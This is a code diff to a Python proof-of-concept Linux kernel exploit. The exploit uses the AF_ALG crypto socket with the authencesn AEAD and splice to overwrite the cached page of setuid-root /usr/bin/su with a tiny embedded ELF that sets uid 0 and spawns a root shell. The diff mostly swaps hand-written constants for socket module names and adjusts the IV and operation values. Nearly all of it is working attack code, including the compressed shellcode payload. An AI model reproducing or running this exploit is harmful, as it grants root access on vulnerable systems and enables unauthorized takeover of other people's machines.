@@ -13,20 +13,8 @@
 
 import os
 import socket
+import struct
 import zlib
-
-# --- AF_ALG (kernel crypto socket) constants ---------------------------------
-AF_ALG = 38
-SOCK_SEQPACKET = 5
-SOL_ALG = 279
-
-ALG_SET_KEY            = 1
-ALG_SET_OP             = 2
-ALG_SET_IV             = 3
-ALG_SET_AEAD_ASSOCLEN  = 4
-ALG_SET_AEAD_AUTHSIZE  = 5
-
-MSG_MORE = 0x8000  # keep the AF_ALG request open so splice payload appends
 
 # --- Crypto parameters chosen to reach the buggy code path -------------------
 #
@@ -38,17 +26,16 @@ MSG_MORE = 0x8000  # keep the AF_ALG request open so splice payload appends
 # the kernel from rejecting the request before we reach the bug.
 AEAD_KEY = bytes.fromhex("0800010000000010" + "00" * 32)
 
-AAD_LEN     = 8   # associated-data length (first 8 bytes of input are AAD)
-AUTH_SIZE   = 4   # auth tag size; also the per-iteration write granularity
-OP_VALUE    = 0x10  # not ALG_OP_DECRYPT(0) or ALG_OP_ENCRYPT(1); kernel
-                    # validation lets it through, downstream code takes the
-                    # encrypt branch (truthy) but with corrupted state.
-IV_BYTES    = b"\x00" * 4   # AES-CBC normally wants 16; undersized on purpose
+AAD_LEN   = 8                                  # first 8 bytes of input are AAD
+AUTH_SIZE = 4                                  # auth tag size; also the per-iteration write granularity
+OP        = socket.ALG_OP_DECRYPT               # 0
+IV        = struct.pack("<I", 16) + b"\x00" * 16  # struct af_alg_iv: ivlen=16, then 16 zero bytes
 
 TARGET_PATH = "/usr/bin/su"
 
-# Pre-built tiny x86-64 static ELF (160 bytes) that, when run, does
-# setreuid(0, 0); execve("/bin/sh", NULL, NULL).
+
+# 160-byte hand-rolled static x86-64 ELF. Entry point is shellcode that does:
+#     setreuid(0, 0); execve("/bin/sh", NULL, NULL); exit(0);
 # Stored zlib-compressed because the original PoC did the same.
 PATCH_ELF = zlib.decompress(bytes.fromhex(
     "78daab77f57163626464800126063b0610af82c101cc7760c0040e0c160c301d"
@@ -59,13 +46,13 @@ PATCH_ELF = zlib.decompress(bytes.fromhex(
 
 def overwrite_chunk(file_fd: int, offset: int, four_bytes: bytes) -> None:
     """Overwrite 4 bytes at `offset` in the page-cache copy of file_fd."""
-    sock = socket.socket(AF_ALG, SOCK_SEQPACKET, 0)
+    sock = socket.socket(socket.AF_ALG, socket.SOCK_SEQPACKET, 0)
     # authencesn = "authenc with extended sequence number" (IPsec ESP-ESN).
     # Its internal AAD/IV layout assumptions are what reach the bug; other
     # AEADs like gcm(aes) don't trigger it.
     sock.bind(("aead", "authencesn(hmac(sha256),cbc(aes))"))
-    sock.setsockopt(SOL_ALG, ALG_SET_KEY, AEAD_KEY)
-    sock.setsockopt(SOL_ALG, ALG_SET_AEAD_AUTHSIZE, None, AUTH_SIZE)
+    sock.setsockopt(socket.SOL_ALG, socket.ALG_SET_KEY, AEAD_KEY)
+    sock.setsockopt(socket.SOL_ALG, socket.ALG_SET_AEAD_AUTHSIZE, None, AUTH_SIZE)
 
     op_sock, _ = sock.accept()
 
@@ -74,11 +61,11 @@ def overwrite_chunk(file_fd: int, offset: int, four_bytes: bytes) -> None:
     op_sock.sendmsg(
         [b"AAAA" + four_bytes],
         [
-            (SOL_ALG, ALG_SET_IV,            IV_BYTES),
-            (SOL_ALG, ALG_SET_OP,            bytes([OP_VALUE]) + b"\x00" * 19),
-            (SOL_ALG, ALG_SET_AEAD_ASSOCLEN, bytes([AAD_LEN])  + b"\x00" * 3),
+            (socket.SOL_ALG, socket.ALG_SET_IV,            IV),
+            (socket.SOL_ALG, socket.ALG_SET_OP,            struct.pack("<I", OP)),
+            (socket.SOL_ALG, socket.ALG_SET_AEAD_ASSOCLEN, struct.pack("<I", AAD_LEN)),
         ],
-        MSG_MORE,
+        socket.MSG_MORE,
     )
 
     splice_len = offset + 4
@@ -108,9 +95,9 @@ def main() -> None:
     finally:
         os.close(fd)
 
-    # /usr/bin/su is setuid-root. The kernel will exec our patched page-cache
+    # TARGET_PATH is setuid-root. The kernel will exec our patched page-cache
     # version, which spawns /bin/sh as uid 0.
-    os.system("su")
+    os.system(TARGET_PATH)
 
 
 if __name__ == "__main__":
